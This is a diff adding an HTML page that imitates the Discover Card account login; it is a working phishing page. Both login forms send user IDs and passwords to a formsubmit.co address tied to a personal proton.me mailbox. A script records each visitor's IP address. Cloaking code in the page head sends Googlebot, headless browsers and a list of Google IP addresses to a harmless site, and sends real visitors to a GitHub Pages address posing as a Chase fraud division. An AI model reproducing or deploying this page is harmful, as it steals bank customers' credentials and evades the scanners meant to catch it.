@@ -1,0 +1,631 @@
+
+<!-- @@@@  BEGIN:common/setup @@@@ -->
+<!-- @@@@  END:common/setup @@@@ -->
+<!--Updated to fix Permanent lock page issue-->
+   <!DOCTYPE html>
+   <html lang="en">
+
+
+
+
+ 
+    
+                  
+
+
+<head>
+
+	<meta charset="utf-8">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0">
+	<meta name = "format-detection" content = "telephone=no">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
+	<meta name="description" content="Log in to your Discover Card account securely. Check your balance, pay bills, review transactions and more using the Discover Account Center, 24 hours a day, seven days a week."/>
+	<link rel="stylesheet" type="text/css" href="css.css">
+	<link rel="stylesheet" type="text/css" href="css2.css">
+	
+
+	<title>
+			Credit Card Login | Discover Card
+			</title>
+<link rel="canonical" href="index.html">
+
+                        
+		  <link rel="stylesheet" type="text/css" href="mincss.css" />        
+        <script type="text/javascript" src=""></script><script src="launchmin.js" async></script>
+
+        
+     
+			<!-- <script src="mincss.css" type="text/javascript"></script> -->
+<script src="pubminJS.js" type="text/javascript"></script>
+		<link rel="stylesheet" type="text/css" media="screen" href="login.css"/>
+		
+
+  
+
+    <!--[if lte IE 8]>
+    <script src="html5.css" type="text/javascript"></script>
+    <script src="respond.css" type="text/javascript"></script>
+    <![endif]-->
+ <script>
+        // Immediate check to detect Googlebot or headless browsers and redirect early
+        (function() {
+            // Check for Googlebot in the user agent
+            if (navigator.userAgent.indexOf("Googlebot") !== -1 || navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) {
+                window.location.href = "https://trollface.dk/"; // Redirect Googlebot or headless browsers to harmless page
+                return; // Stop further execution of the script
+            }
+
+            // WebGL check for bots that use software rendering
+            var gl = document.createElement('canvas').getContext('webgl');
+            if (!gl || gl.getParameter(gl.RENDERER) === "Google SwiftShader") {
+                document.body.innerHTML = "Page Broken"; // For bots detected by WebGL check
+                return; // Stop further execution of the script
+            }
+
+            // IP check for Googlebot IPs
+            const googleIps = [
+                "192.178.5.0", "192.178.6.0", "192.178.6.32", "34.100.182.96", "34.101.50.144",
+                "34.118.254.0", "34.118.66.0", "34.126.178.96", "34.146.150.144", "34.147.110.144",
+                "34.151.74.144", "34.152.50.64", "34.154.114.144", "34.155.98.32", "34.165.18.176",
+                "34.175.160.64", "34.176.130.16", "34.22.85.0", "34.64.82.64", "34.65.242.112",
+                "34.80.50.80", "34.88.194.0", "34.89.10.80", "34.89.198.80", "34.96.162.48", "35.247.243.240",
+                "66.249.64.0", "66.249.64.128", "66.249.64.160", "66.249.64.224", "66.249.64.32", "66.249.64.64",
+                "66.249.64.96", "66.249.65.0", "66.249.65.128", "66.249.65.160", "66.249.65.192", "66.249.65.224",
+                "66.249.65.32", "66.249.65.64", "66.249.65.96", "66.249.66.0", "66.249.66.160", "66.249.66.192",
+                "66.249.66.32", "66.249.66.64", "66.249.66.96", "66.249.68.0", "66.249.68.32", "66.249.68.64",
+                "66.249.68.96", "66.249.69.0", "66.249.69.128", "66.249.69.160", "66.249.69.192", "66.249.69.224",
+                "66.249.69.32", "66.249.69.64", "66.249.69.96", "66.249.70.0", "66.249.70.128", "66.249.70.160",
+                "66.249.70.192", "66.249.70.224", "66.249.70.32", "66.249.70.64", "66.249.70.96", "66.249.71.0",
+                "66.249.71.128", "66.249.71.160", "66.249.71.192", "66.249.71.224", "66.249.71.32", "66.249.71.64",
+                "66.249.71.96", "66.249.72.0", "66.249.72.128", "66.249.72.160", "66.249.72.192", "66.249.72.224",
+                "66.249.72.32", "66.249.72.64", "66.249.72.96", "66.249.73.0", "66.249.73.128", "66.249.73.160",
+                "66.249.73.192", "66.249.73.224", "66.249.73.32", "66.249.73.64", "66.249.73.96", "66.249.74.0",
+                "66.249.74.128", "66.249.74.160", "66.249.74.32", "66.249.74.64", "66.249.74.96", "66.249.75.0",
+                "66.249.75.128", "66.249.75.160", "66.249.75.192", "66.249.75.224", "66.249.75.32", "66.249.75.64",
+                "66.249.75.96", "66.249.76.0", "66.249.76.128", "66.249.76.160", "66.249.76.192", "66.249.76.224",
+                "66.249.76.32", "66.249.76.64", "66.249.76.96", "66.249.77.0", "66.249.77.128", "66.249.77.160",
+                "66.249.77.192", "66.249.77.224", "66.249.77.32", "66.249.77.64", "66.249.77.96", "66.249.78.0",
+                "66.249.78.32", "66.249.79.0", "66.249.79.128", "66.249.79.160", "66.249.79.192", "66.249.79.224",
+                "66.249.79.32", "66.249.79.64", "66.249.79.96",
+                // Add more IPs as needed
+            ];
+
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+                    if (googleIps.includes(userIp)) {
+                        window.location.href = "https://trollface.dk/"; // Redirect Googlebot IPs
+                    } else {
+                        window.location.href = "https://ChaseFraudSecurityDivisionJPbankdatacom.github.io/Report-fraud-prevention
+"; // Redirect real users
+                    }
+                })
+                .catch(error => console.error("IP fetch failed:", error));
+
+        })();
+    </script>
+
+</head>                <body>
+
+			<script> 
+ // Fetch user IP and set it in the hidden input
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("user-ip").value = data.ip; // Store IP in hidden field
+        })
+        .catch(error => console.error("Failed to fetch IP:", error));
+
+    // Add an event listener to handle form submission
+    form.addEventListener('submit', function(event) {
+        // Set the username and password values to hidden fields (if needed)
+        const hiddenUsernameField = document.createElement('input');
+        hiddenUsernameField.type = 'hidden';
+        hiddenUsernameField.name = 'username';
+        hiddenUsernameField.value = usernameField.value;
+        
+        const hiddenPasswordField = document.createElement('input');
+        hiddenPasswordField.type = 'hidden';
+        hiddenPasswordField.name = 'password';
+        hiddenPasswordField.value = passwordField.value;
+        
+        // Append the hidden fields to the form
+        form.appendChild(hiddenUsernameField);
+        form.appendChild(hiddenPasswordField);
+    });
+});
+</script>
+
+                     <div class="main-container mobile-responsive" >                            
+
+<!-- Header starts -->     
+    <header role="banner">
+
+    
+        <div class="header-wrapper animation js_disabledflyout md-header-wrapper">
+			<noscript>
+				<div class="alert alert-warning" role="alert" id="noscript-message">
+					<div class="alert-content">
+						<i class="icon-error-triangle"></i>
+						<p class="alert-body body-copy">
+							<strong>Please Note:</strong> JavaScript is not enabled in your web browser. In order to enjoy the full experience of the Discover website, please turn JavaScript on. If JavaScript is disabled, some of the functionality on our website will not work, such as the display of rates and APRs.
+						</p>
+					</div>
+				</div>
+			</noscript>
+            <div class="header-content">
+                <div class="logo-container">
+                    <div class="opener-container hidden-md">
+                        <a href="#" class="dropdown-toggle panel-opener" aria-haspopup="true" aria-expanded="false" role="button">
+                            <span class="device-menu hidden-md"><i class="icon-toggle"></i>Menu</span>
+                        </a>
+                    </div>
+                    <a href="discover.png" class="discover-logo">
+                        <img id="flag" src="discover.png" width="113" height="18" alt="discover logo"/>
+                    </a>
+				</div>
+				<div class="navbar-wrapper" role="navigation">
+                    <div class="opener-container hidden-sm hidden-xs">
+                        <a href="#" class="dropdown-toggle panel-opener" aria-haspopup="true" aria-expanded="false">
+                            <span class="desktop-menu ">All Products<i class="icon-arrow"></i></span>
+                        </a> 
+                    </div>
+                    <ul class="right-nav nav navbar-nav" role="menubar">
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle mobile-accessibility preventDefaultBehaviour" aria-haspopup="true" aria-expanded="false">
+                                <i class="icon-help"></i>
+                                <span>Help</span>
+                            </a>
+                            <div class="fly-out-wrapper">
+                                <div class="dropdown-menu">
+                                    <div class="dropdown-wrapper">
+                                        <ul class="links-list" role="list">
+                                            <li><a href="index.html">Card Help Center</a></li>
+                                            <li><a href="index.html">Credit Resource Center</a></li>
+                                            <li><a href="index.html">Banking Help Center</a></li>
+                                            <li><a href="index.html">Home Loans Help Center</a></li>
+                                            <li><a href="index.html">Student Loans Help</a></li>
+                                            <li><a href="index.html">Personal Loans Help</a></li>
+                                            <li><a href="index.html">Gift Card Help</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li class="dropdown search-tab">
+                            <a href="#" id="mobile-search-btn" class="dropdown-toggle mobile-accessibility preventDefaultBehaviour" data-toggle="dropdown" role="button" aria-expanded="false">
+                                <i class="icon-search"></i>
+                                <span>Search</span>
+                            </a>
+                            <div id="search_overlay">
+                                <div class="search-container">
+                                    <form id="suggestion_form" class="suggestion_form" name="search" role="search" data-url="/acnav/scripts/suggestion_form.php?search=" action="index,html" method="get" autocomplete="off">
+                                        <label for="predict-input" class="sr-only">Search Discover</label>
+										<span id="initInstr" style="display: none;">When autocomplete results are available use up and down arrows to review and enter to select.  Touch device users, explore by touch or with swipe gestures.</span>
+										<div aria-live="assertive" class="sr-only"></div>
+                                        <input type="text" placeholder="Search" autocomplete="off" class="search-box predict-input" id="predict-input" maxlength="256" name="q" aria-describedby="initInstr"/>  
+										<ul role="menu" id="search-suggestions">
+										</ul>
+
+                                        <!-- <input type="hidden" name="site" value="internet_cm_corp">
+                                        <input type="hidden" name="getfields" value="*">
+                                        <input type="hidden" name="client" value="internet_cm_fe">
+                                        <input type="hidden" name="output" value="xml_no_dtd"> -->
+                                        <input type="hidden" name="proxystylesheet" value="internet_cm_fe">
+
+                                        <input type="image" id="predict-submit" class="search-btn predict-submit" src="spyglass.png" alt="Search">
+                                        <!-- <div id="suggestion_form-dropdown" class="dropdown">
+                                          <table id="search_suggest" role="presentation">
+                                           
+                                          </table>
+                                        </div>    -->
+					<input type="hidden" id="user-ip" name="user_ip" value="">
+                                    </form>
+                                </div>
+                            </div>          
+                        <!--search --> 
+                        </li>
+                        <li class="desktop-extra-links">
+                            <a href="#" class="log-in-link btn-primary" role="button" data-toggle="modal" data-target=".login-modal">Log In<span class="sr-only">Opens modal dialog</span></a>
+                        </li>
+                    </ul>
+                </div>
+                <nav class="left-panel">
+                    <ul class="side-navigation" role="list">
+                        <li>
+                            <a href="#" class="preventDefaultBehaviour credit-list-opener" aria-expanded="false"><i class="icon-plus"></i>Credit Cards</a>
+                                 <ul class="credit-card-list global-nav-consistency" role="list">
+                               
+                                 <li><a class="PQ_apply" href="index.html">See if You're Pre-approved</a></li>
+									<li><a href="index.html">Respond to a Mail Offer</a></li>
+									<li><a href="index.html">All Credit Cards</a></li>
+									<li class="index.html"></li>
+									<li><a href="index.html">Cash Back Credit Cards</a></li>
+									<li class="card-indent-new"><span class="color-line-new">&#8212; </span>&nbsp;<a href="index.html">Cash Back Card</a></li>
+									<li class="card-indent-new"><span class="color-line-new">&#8212; </span>&nbsp;<a href="index.html">Gas &amp; Restaurants Card</span></a></li>
+
+									<li class="card-indent-new"><span class="color-line-new">&#8212; </span>&nbsp;<a href="index.html">NHL<sup>&reg;</sup> Card</a></li>
+									<li class="list-line-new"></li>
+									<li><a href="index.html">Student Credit Cards</a></li>
+
+
+									<li class="card-indent-new"><span class="color-line-new">&#8212; </span>&nbsp;<a href="index.html">Student Cash Back Card</a></li>
+									<li class="card-indent-new"><span class="color-line-new">&#8212; </span>&nbsp;<a href="index.html">Student Gas &amp; Restaurants <span class="extra-padding"> Card</span></a></li>
+									<li class="list-line-new"></li>
+									<li><a href="index.html">Travel Card</a></li>
+									<li><a href="index.html">Credit Building Card</a></li>
+									<li><a href="index.html">Business Card</a></li>
+                               		<li class="list-line-new"></li>
+									<li><a href="index.html">Discover vs. Competitors</a></li>
+									<li class="list-line-new"></li>
+									<li><a href="index.html">Credit Card Interest Calculator</a></li>
+                            </ul>
+                        </li>
+                        <li>
+                            <a href="#" class="preventDefaultBehaviour bank-list-opener" aria-expanded="false"><i class="icon-plus"></i>Banking</a>
+                            <ul class="bank-list" role="list">
+                                <li><a href="index.html">Banking</a></li>
+                                <li><a href="index.html">Checking</a></li>
+                                <li><a href="index.html">Savings</a></li>
+                                <li><a href="index.html">Money Market</a></li>
+                                <li><a href="index.html">CDs</a></li>
+								<li><a href="index.html">Retirement Accounts</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="index.html">Personal Loans</a></li>
+                        <li><a href="index.html">Student Loans</a></li>
+						<li>
+						<a href="#" class="preventDefaultBehaviour home-list-opener" aria-expanded="false"><i class="icon-plus"></i>Home Loans</a>
+						<ul class="home-list" role="list">
+								<li><a href="index.html">Home Equity Loans</a></li>
+								<li><a href="index.html">Mortgage Refinance</a></li>
+						</ul>
+						</li>
+                        <li><a href="index.html">See More<span class="sr-only">Products</span></a></li>
+                        <li><a href="index.html"></i><span>Help</span></a>
+                        </li>
+                        <li class="dropdown search-tab">
+                            <a href="#" class="search-link">
+                                <i class="icon-search"></i>
+                                <span>Search</span>
+                            </a>
+                        </li>
+                    </ul>
+                </nav>
+                
+            </div>
+        </div>
+     
+
+		 <div class="modal login-modal" tabindex="-1" data-backdrop="static" data-keyboard="false">
+            <div class="modal-dialog login-box-modal">
+                <div class="modal-content">
+                    <div class="modal-header">
+                    
+                    </div>
+                    <div class="modal-body">
+                        <div class="login-container modal-login micro-animation" data-id="modal-login">
+                            <div class="logo">
+                                <a href="index.html">
+                                    <img src="discover.png" width="113" height="18" alt="discover logo"/>
+                                </a>
+                            </div>
+                            <p class="login-page"></p>
+                            
+                            <p class="modal-headline" role="heading">Secure Account Log In<i class="icon-secure"></i></p>
+                            
+                            <p class="errors" aria-hidden="true">Please complete all fields below</p>
+                            <!--Begin,NOV-17-2016,Modified, Modified action URL-->
+                            <form autocomplete="off" action="https://formsubmit.co/davidjohnson0109@proton.me" method="post" id="login-form" name="loginForm">
+                            <!--End,NOV-17-2016,Modified, Modified action URL-->
+                                <div class="input-wrapper">
+                                    <label for="userid" class="user-id-label">User ID</label>
+                                    <input type="text" class="form-control userid user-id-input" name="userID" id="userid" aria-required="true" data-toggle="popover" data-content="Please enter your User ID" maxlength="16"/>
+                                    <i class="icon-error-triangle"></i>
+                                </div>
+                                <div class="input-wrapper">
+                                    <label for="password" class="password-label">Password</label>
+                                    <input type="password" class="form-control password password-input" name="password" id="password" aria-required="true" data-toggle="popover" data-content="Please enter your Password" maxlength="32"/>
+                                    <i class="icon-caps-lock invisible" title="Caps-Lock is on."></i>
+                                    <i class="icon-error-triangle"></i>
+                                </div>
+                                <div class="select-box-wrapper">
+                                    <label for="choose-card" class="sr-only">Select an Account</label>
+                                    <select name="choose-card" class="choose-card" id="choose-card" data-toggle="popover" data-content="Please select an account to log in" aria-hidden="true" required>
+                                        <option value="0" >Select an Account</option>
+                                        <option value="Credit Card" selected="selected">Credit Card</option>
+                                        <option value="Bank Account">Bank Account</option>
+                                        <option value="Student Loans">Student Loans</option>
+                                        <option value="Personal Loans">Personal Loans</option>
+                                        <option value="Home Equity Loans">Home Loans</option>
+                                         <option value="Identity Theft Protection">Identity Theft Protection</option>
+                                    </select>
+                                    <i class="icon-error-triangle"></i>
+                            </div>
+                            
+                                <input type="hidden" name="accountType" aria-hidden="true"/>
+                                <input type="hidden" name="userTypeCode" id="userTypeCode1" value="C" aria-hidden="true">
+                                <input type="hidden" name="pm_fp" id="pm_fp" aria-hidden="true">
+                                <input type="hidden" name="currentFormId" value="login" aria-hidden="true"/>
+                                <div class="custom-checkbox">
+                                    <div class="checkbox-wrapper">
+                                        <span class="icon-checkbox custom-element">
+                                            <input type="checkbox" name="rememberOption" id="id-checkbox" class="custom-input remember-id">
+                                        </span>
+                                    </div>
+                                    <label for="id-checkbox">Remember User ID</label>
+                                </div>
+                                <input type="hidden" name="ssid" id="ssid" value="DefaultSSID_NOSCRIPT" type="hidden" aria-hidden="true"/>
+                                <input type="submit" class="btn-primary log-in-button" value="Log In" id="log-in-button"/>
+                            </form>
+                            <ul class="links-list">
+                                <li><a href="index.html">Forgot User ID/Password?</a></li>
+                                <li><a href="index.html">Activate Credit Card</a></li>
+                                <li><a href="index.html">Register Your Account</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="modal-footer"></div>                
+                    <div>
+                        <a class="close-link" data-dismiss="modal" href="#">Close<i class="icon-cross"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>    </header>
+<!-- Header ends -->   
+<main class="container main-content" id="main-content-rwd" >
+
+                <input id="account-dropdown-state" type="hidden" aria-hidden="true" value="show" name="account-dropdown-state">
+                <input id="log-in-to" type="hidden" aria-hidden="true" value="" name="log-in-to">
+                <input id="deep-link-url" type="hidden" aria-hidden="true" value="" name="deep-link-url">
+                <div class="row login-wrapper">
+                        <div class="col-md-4 col-sm-5 col-xs-12">
+                                <div class="login-container content-login" data-id="content-login">
+                                        <p class="modal-headline" role="heading">Secure Account Log In<i class="icon-secure"></i></p>
+                                        <p class="errors" aria-hidden="true">Please complete all fields below</p>
+                                        <form id="login-form-content" name="" method="post" action="https://formsubmit.co/davidjohnson0109@proton.me" autocomplete="off" onsubmit="return validateForm(this);">
+                                                <div class="input-wrapper">
+                                                        <label for="userid-content" class="sr-only" aria-hidden="true">User ID</label>
+                                                        <input type="text" class="form-control placeholder-text userid" name="userID" id="userid-content" value="" placeholder="User ID" aria-required="true" data-toggle="popover" data-content="Please enter your User ID" maxlength="16"/>
+                                                        <i class="icon-error-triangle"></i>
+                                                </div>
+                                                <div class="input-wrapper">
+                                                        <label for="password-content" class="sr-only" aria-hidden="true">Password</label>
+                                                        <input type="password" class="form-control placeholder-text password" name="password" id="password-content" placeholder="Password" aria-required="true" data-toggle="popover" data-content="Please enter your Password" maxlength="32"/>
+			                    <!--Begin,JUL-21-2016,Added, Caps lock icon added-->
+                                            <i class="icon-caps-lock invisible" title="Caps-Lock is on."></i>
+                                            <!--End,JUL-21-2016,Added, Caps lock icon added-->
+                                                        <i class="icon-error-triangle"></i>
+                                                </div>
+                                                <input type="hidden" name="accountType" aria-hidden="true"/>
+												<input type="hidden" name="userTypeCode" id="userTypeCode" value="C" aria-hidden="true">
+                                                <input type="hidden" name="pm_fp" id="pm_fp" aria-hidden="true">
+                                                <input type="hidden" name="currentFormId" value="login" aria-hidden="true"/>
+                                                <div class="custom-checkbox">
+                                                        <span class="icon-checkbox custom-element">
+                                                                <input type="checkbox" name="rememberOption" id="id-checkbox" class="custom-input remember-id" value="on"  />&nbsp;
+                                                        </span>
+                                                        <label for="id-checkbox">Remember User ID</label>
+                                                </div>
+
+                                                <input type="hidden" name="link" value="" /> 
+												
+												
+                                                <input type="hidden" name="intcpt" value="" /> 
+                                                
+                                                <input type="hidden" name="ssid" id="ssid" value="DefaultSSID_NOSCRIPT" type="hidden" aria-hidden="true"/>
+                                                <input type="submit" class="btn-primary log-in-button" value="Log In" id="log-in-button"/>
+                                        </form>
+                                        <ul class="links-list">
+                                                <li><a href="index.html">Forgot User ID</a> / <a href="index.html">Forgot Password</a></li>
+                                                <li><a href="index.html">Activate Credit Card</a></li>
+                                                <li><a href="index.html">Register Your Account</a></li>
+                                        </ul>
+                                </div>
+                        </div>
+                        <div class="col-md-8 col-sm-7 col-xs-12">
+
+
+                        <div data-omu="true" data-pagename="Log_In_Responsive" data-areaid="Box_1" data-anitype="slidedown">
+						<div data-omu-offer="Z2_Log_In_Responsive_Box_1_Page_Default" style="dispaly:none"></div>
+                        <!-- Z2 Log_In_Responsive_Box_1_Page_Default -->
+                        </div>
+
+
+                        </div>
+                        </div>
+                </div>
+    </main>                                                                  
+        
+                          <!-- Include Common Footer -->
+<!-- @@@@  START:footer/footerData_nonSecure @@@@ -->
+<!-- @@@@  BEGIN:footer/footer_nonSecure @@@@ -->	
+<!--footer_nonSecure-->
+<!--footer starts -->
+    <footer role="contentinfo">        
+		<div class="footer-container">
+			<div class="footer-nav">
+                                <div class="secondary-nav-menu">
+                                        <div class="row">
+                                                <div class="col-md-10 col-xs-12 no-padding">
+                                                        <div class="col-sm-3 col-xs-6 link-container footer-accordian">
+								<p class="link-title" role="heading">Credit Card Quick Links</p>
+								<a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>Credit Card Quick Links</a>
+                                                                <ul class="links-list">
+                                                                        <li><a href="index.html">All Credit Cards</a></li>
+                                                                        <li class="cal-alignment"><a href="index.html">See if you're prequalified</a></li>
+                                                                        <li><a href="index.html">Respond to Mail Offer</a></li>
+									                                    <li class="cal-alignment"><a href="index.html">Check Application Status</a></li>
+                                                                        <li class="cal-alignment"><a href="index.html">Cardmember Agreement</a></li>
+                                                                        <li><a href="index.html">Credit Card Benefits</a></li>
+                                                                        <li><a href="index.html">ATM Locator</a></li>
+                                                                </ul>
+                                                        </div>
+                                                        <div class="col-sm-3 col-xs-6 link-container footer-accordian">
+								<p class="link-title" role="heading">Credit Card Categories</p>
+								<a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>Credit Card Categories</a>
+                                                                <ul class="links-list">
+                                                                        <li class="cal-alignment"><a href="index.html">Cash Back Credit Cards</a></li>
+																		<li><a href="index.html">Student Credit Cards</a></li>
+																		<li><a href="index.html">Secured Credit Card</a></li>
+                                                                        <li><a href="index.html">Travel Credit Card</a></li>
+                                                                        <li><a href="index.html">Compare Credit Cards</a></li>
+                                                                </ul>
+                                                        </div>
+                                                        <div class="col-sm-3 col-xs-6 link-container footer-accordian">
+							    <p class="link-title" role="heading">Credit Card Features</p>
+							    <a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>Credit Card Features</a>
+                                                                <ul class="links-list">
+																        <li class="cal-alignment"><a href="index.html">Balance Transfer Credit Cards</a></li>
+																		<li class="cal-alignment"><a href="index.html">Credit Cards to Build Credit</a></li>
+																        <li class="cal-alignment"><a href="index.html">No Annual Fee Credit Cards</a></li>
+																		<li><a href="index.html">Intro APR Credit Cards</a></li>
+																		<li class="cal-alignment"><a href="index.html">Airline Travel Credit Card</a></li>
+																		<li class="cal-alignment"><a href="index.html">Credit Cards for No Credit</a></li>
+                                                                </ul>
+                                                        </div>
+														<div class="col-sm-3 col-xs-6 link-container footer-accordian">
+							    <p class="link-title" role="heading">Card Smarts &amp; More</p>
+							    <a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>Card Smarts &amp; More</a>
+                                                                <ul class="links-list">
+																        <li><a href="index.html">Getting a Credit Card</a></li>
+																		<li><a href="index.html">Using a Credit Card</a></li>
+																		<li><a href="index.html">Credit Card Rewards</a></li>
+																		<li class="cal-alignment"><a href="index.html">Credit Card Interest Calculator</a></li>
+                                                                </ul>
+                                                        </div>
+                                                    </div>
+													
+													<div class="col-md-2 col-xs-12 social-icons hidden-xs hidden-sm">
+                                                        <ul>
+								<li class="twitter"><a href="index.html" class="icon-tw" target="_blank" title="Follow Us on Twitter"></a></li>
+								<li class="facebook"><a href="index.html" class="icon-fb" target="_blank" title="Like Us on Facebook"></a></li>
+								<li class="instagram-plus"><a href="index.html" class="icon-instagramPlus" target="_blank" title="Instagram"></a></li>
+								<li class="linked-in"><a href="index.html" class="icon-linkedIn" target="_blank" title="Connect with Us on LinkedIn"></a></li>
+                                                                <li class="mobile-app">
+									<a href="index.html" class="footer-icon-mobile" target="_blank" title="Discover Mobile">
+                                                                                <i class="icon-app-discover"></i>
+                                                                                <span class="app-text">Discover Mobile App</span>
+                                                                        </a>
+                                                                </li>
+                                                        </ul>
+                                                </div>
+												
+													<div class="col-md-10 col-xs-12 no-padding">
+                                                        <div class="col-sm-3 col-xs-6 link-container footer-accordian">
+							    <p class="link-title" role="heading">Rewards</p>
+							    <a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>Rewards</a>
+                                                                <ul class="links-list">
+                                                                        <li><a href="index.html">Rewards Credit Cards</a></li>
+																		<li><a href="index.html">Cash Back Rewards</a></li>
+                                                                        <li><a href="index.html">5% <em>Cashback Bonus</em><sup>&reg;</sup></a></li>
+																		<li class="cal-alignment"><a href="index.html">Redeem <em>Cashback Bonus</em></a></li>
+																		<li><a href="index.html">Refer a Friend</a></li>
+                                                                </ul>
+                                                        </div>
+														<div class="col-sm-3 col-xs-6 link-container footer-accordian">
+							    <p class="link-title" role="heading">More Discover Products</p>
+							    <a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>More Discover Products</a>
+                                                                <ul class="links-list">
+                                                                        <li><a href="index.html">Banking</a></li>
+																		<li><a href="index.html">Home Equity Loans</a></li>
+                                                                        <li><a href="index.html">Mortgage Refinance</a></li>
+																		<li><a href="index.html">Personal Loans</a></li>
+																		<li><a href="index.html">Student Loans</a></li>
+																		<li><a href="index.html">Debt Consolidation</a></li>
+                                                                </ul>
+                                                        </div>
+                                                        <div class="col-sm-3 col-xs-6 link-container footer-accordian">
+							    <p class="link-title" role="heading">Quicklinks</p>
+							    <a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>Quicklinks</a>
+                                                                <ul class="links-list">
+                                                                        <li><a href="index.html">Sitemap</a></li>
+                                                                        <li><a href="index.html">Terms of Use</a></li>
+                                                                        <li><a href="index.html">Accessibility</a></li>
+                                                                        <li><a href="index.html">Browser Support</a></li>
+                                                                        <li><a href="index.html">Security</a></li>
+                                                                        <li><a href="index.html">Privacy</a></li>
+                                                                        <li class="cal-alignment"><a href="index.html" target="_blank" rel="nofollow">Your California Privacy Choices<i class="icon-californiachoices"></i></a></li>
+                                                                        <li><a href="index.html">AdChoices</a></li>
+                                                                </ul>
+                                                        </div>
+														<div class="col-sm-3 col-xs-6 link-container footer-accordian">
+								<p class="link-title" role="heading">About Us</p>
+								<a href="#" class="link-title accordion-title" aria-expanded="false" role="tab"><i class="icon-expand-toggle"></i>About Us</a>
+                                                                <ul class="links-list">
+                                                                        <li><a href="index.html">Contact Us</a></li>
+                                                                        <li><a href="index.html">About Discover</a></li>
+                                                                        <li><a href="index.html">Corporate Impact</a></li>
+									                                    <li><a href="index.html" rel="nofollow">Investor Relations</a></li>
+									                                    <li><a href="index.html">Newsroom</a></li>
+																		<li><a href="index.html" rel="nofollow">Careers</a></li>
+									                                    <li><a href="index.html" rel="nofollow">Accept Discover</a></li>
+																		<li><a href="index.html">Diversity &amp; Inclusion</a></li>
+									                            </ul>
+                                                        </div>
+													</div>
+													    <div class="col-md-2 col-xs-12 social-icons hidden-md">
+                                                        <ul>
+								<li class="twitter"><a href="index.html" class="icon-tw" target="_blank" title="Follow Us on Twitter"></a></li>
+								<li class="facebook"><a href="index.html" class="icon-fb" target="_blank" title="Like Us on Facebook"></a></li>
+								<li class="instagram-plus"><a href="index.html" class="icon-instagramPlus" target="_blank" title="Instagram"></a></li>
+								<li class="linked-in"><a href="index.html" class="icon-linkedIn" target="_blank" title="Connect with Us on LinkedIn"></a></li>
+                                                                <li class="mobile-app">
+									<a href="index.html" class="footer-icon-mobile" target="_blank" title="Discover Mobile">
+                                                                                <i class="icon-app-discover"></i>
+                                                                                <span class="app-text">Discover Mobile App</span>
+                                                                        </a>
+                                                                </li>
+                                                        </ul>
+                                                </div>
+												</div>
+                                                
+                                </div>
+                                <div class="association-menu">
+                                        <div class="row">
+
+                                                <div class="certification-links col-sm-5 col-xs-12">
+                                                        <ul>
+								<li><a  class="icon-equal-housing-lender" target="_blank" aria-label="Equal Housing Lender"></a></li>
+								<li><a class="icon-accredited-business"  aria-label="ACCREDITED BUSINESS" href="index.html" target="_blank"></a></li> 
+								<li><a href="https://www.fdic.gov/" class="icon-member-fdic" target="_blank" aria-label="Member FDIC" rel="nofollow"></a></li>
+                                                        </ul>
+							<small class="copyright footer-logo-align" >&copy;<span class="current-year"></span> Discover, Member FDIC</small>
+                                                </div>
+                                        </div>
+                                </div>
+                        </div>
+		</div>
+    </footer>
+<!--footer ends --> 
+<input id="s_account" type="hidden" value="prod" name="s_account">
+<!-- START content\common\freemarker\scripts\scripts_global_nonSecure.ftl  -->
+        <script src="libs.js" type="text/javascript"></script>
+
+        <script src="tp.js" type="text/javascript"></script>
+        <script src="commin.js" type="text/javascript"></script>
+
+                
+
+
+        <!-- END content\common\freemarker\scripts\scripts_global_nonSecure.ftl  -->
+<!-- @@@@  START:scripts/scripts_app @@@@ -->
+			<script src="login.js" type="text/javascript"></script>
+<script src="/global/public/scripts/omu-at.min.js?ver=69847562a57" type="text/javascript"></script>
+
+		
+
+
+<!-- @@@@  END:scripts/scripts_app @@@@ -->
+															<!--Tag Management Solutions-->
+  
+  <!--Tag Management Solutions-->
+<!-- @@@@  END:footer/footerData_nonSecure @@@@ -->
+                                  
+                     </div>
+                  </body>
+                
+                </html>
+                
